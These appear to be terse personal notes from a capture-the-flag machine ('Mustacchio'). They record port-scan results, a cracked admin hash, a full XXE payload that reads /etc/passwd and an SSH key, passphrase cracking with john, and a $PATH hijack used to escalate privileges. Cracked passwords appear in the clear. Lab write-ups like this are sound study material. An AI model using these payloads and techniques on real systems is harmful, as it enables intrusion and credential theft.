	Apache/2.4.18 (Ubuntu) Server at 10.10.54.217 Port 80</
#	/contact input fields
/custom/js contains users.bak - sqlite db backup

22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
8765/tcp open  http    nginx 1.10.3 (Ubuntu) - ADMIN PANEL 
|_http-title: Mustacchio | Login

admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b - sql db dump
Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
result - bulldog19 

admin panel submit empty comment => Insert XML Code!

/assets nginx path 403
## barry user ssh key

comment in adminpanel source code in response after submit comment request
//document.cookie = "Example=/auth/dontforget.bak";
in dontforget.bak file is an xml form for admin panel comment
will try to get barry's ssh key via xxe
/etc/passwd file retrieved via xxe payload:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>


barry clad
joe hamd

barry's private ssh key needs passphrase -> cracked via ssh2john >> crackme -> john --wordlist=$ROCKYOU crackme

ssh password: urieljames

linux seems to be hardened a bit, no sudo password very little vectors
utilize the joes live log binary and override where tail binary is pulled from $PATH to escalate
